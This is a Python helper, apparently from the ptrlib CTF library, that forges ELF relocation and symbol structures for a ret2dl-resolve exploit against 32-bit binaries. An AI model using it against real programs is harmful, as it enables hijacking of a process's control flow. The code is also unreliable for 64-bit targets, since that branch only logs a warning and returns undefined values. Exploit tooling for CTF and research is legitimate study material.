from logging import getLogger
from ptrlib.util.packing import *

logger = getLogger(__name__)

def struct_ret2dl(addrList, elf, base=None):
    """
    Args:
        addrList (int): Address to put reloc, sym, symstr
        elf (ELF)  : Target ELF
        base (int) : PIE base if PIE is enabled
    """
    if not elf.pie():
        proc_base = 0
    elif base:
        proc_base = base
    else:
        logger.warn("PIE base is unknown. Set 0 if you handle it by yourself.")
        logger.warn("In that case make sure `reloc` is offset from PIE base.")
        return None
    
    addr_dynsym = proc_base + elf.section('.dynsym')
    addr_dynstr = proc_base + elf.section('.dynstr')
    addr_relplt = proc_base + elf.section('.rel.plt')

    addr_reloc  = addrList['reloc']
    addr_sym    = addrList['sym']
    addr_symstr = addrList['symstr']
    addr_got    = addrList['got']

    if addr_sym & 0xF != addr_dynsym & 0xF:
        logger.warn("addr_sym & 0xf must be {}".format(hex(addr_dynsym & 0xF)))
        addr_sym += 0x10 - ((addr_sym - addr_dynsym) & 0xF)
        logger.warn("It should be {}".format(hex(addr_sym)))

    if elf.elfclass == 32:
        reloc  = p32(addr_got)
        reloc += p32(((addr_sym - addr_dynsym) << 4) & ~0xFF | 7)
        sym  = p32(addr_symstr - addr_dynstr)
        sym += p32(0)
        sym += p32(0)
        sym += p32(0x12)
    else:
        logger.warn("Not implemented yet!")
    
    return addr_reloc - addr_relplt, reloc, sym
